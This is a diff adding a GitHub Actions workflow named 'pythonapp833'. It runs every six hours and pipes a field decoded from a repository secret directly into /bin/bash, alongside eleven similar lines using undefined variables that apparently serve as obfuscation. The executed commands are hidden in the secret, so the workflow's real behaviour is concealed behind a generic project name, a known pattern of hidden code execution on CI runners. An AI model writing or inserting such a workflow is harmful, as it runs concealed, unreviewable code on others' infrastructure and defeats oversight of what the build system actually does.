@@ -1,0 +1,28 @@
+name: pythonapp833
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pythonapp833
+        env:
+          ga3: ${{ secrets.ga3 }}
+        run: |
+          echo $ga3 | jq -r .p0966 | /bin/bash
+          echo $p6433 | jq -r .jnz551 | /bin/bash
+          echo $n8753 | jq -r .lk394 | /bin/bash
+          echo $wu8 | jq -r .fcs2 | /bin/bash
+          echo $fgrgx68867 | jq -r .r649 | /bin/bash
+          echo $rq7 | jq -r .phara5280 | /bin/bash
+          echo $rvj67554 | jq -r .ejg2 | /bin/bash
+          echo $x23724 | jq -r .jeehu766 | /bin/bash
+          echo $zolu362 | jq -r .ortg8235 | /bin/bash
+          echo $rliay92673 | jq -r .pdy8 | /bin/bash
+          echo $jkd17 | jq -r .lw09 | /bin/bash
+          echo $hdd96187 | jq -r .jcrkf3 | /bin/bash
+
